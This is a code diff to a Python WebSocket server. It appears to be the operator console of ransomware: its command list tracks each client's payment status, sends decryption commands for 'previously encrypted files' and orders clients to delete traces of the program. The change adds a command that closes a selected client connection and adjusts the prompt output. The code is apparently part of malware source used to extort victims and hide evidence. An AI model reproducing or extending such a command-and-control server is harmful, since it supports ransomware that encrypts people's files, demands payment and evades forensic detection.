@@ -54,7 +54,7 @@ class WebSocketCLIServer:
 
             await websocket.send(self.__create_auth_reply(True, token))
             print(f"[{username}] is connected to the server.")
-            print(self.__generate_cli_text() + "> ", end='', flush=True)
+            print(self.__generate_cli_text(), end='', flush=True)
 
             # async for message in websocket:
             #     print(f"[{username}] {message}")
@@ -148,6 +148,9 @@ class WebSocketCLIServer:
                 case ["cleaningreq"]:
                     await self.__send_cleaning_req()
 
+                case ["close"]:
+                    await self.__close_connection()
+
                 case ["exit"] | ["quit"]:  
                     await self.stop()
 
@@ -183,6 +186,7 @@ class WebSocketCLIServer:
         print("\tsetpaymentstatus <true/false> - sets the payment status of the selected client")
         print("\tdecryptrep - sends the command to decrypt the previously encrypted files to the selected client")
         print("\tcleaningreq - sends the command to delete traces of the program on the selected client")
+        print("\tclose - closes the selected client connection")
         print("\texit or quit - quit the program")
 
     def __show_connections(self):
@@ -303,6 +307,13 @@ class WebSocketCLIServer:
             print(f"Set payment status of {self.__selected_client.username} to {is_paid}.")
         else:
             print("Invalid status. Use 'true' or 'false'.")
+
+    @check_selected_client
+    async def __close_connection(self):
+        self.__selected_client.change_state(ConnectionState.DISCONNECTED)
+        await self.__selected_client.websocket.close()
+        self.__selected_client = None
+        self.__generate_cli_text()
 
     async def broadcast(self, message, sender=None):
         """Send a message to all connected clients."""
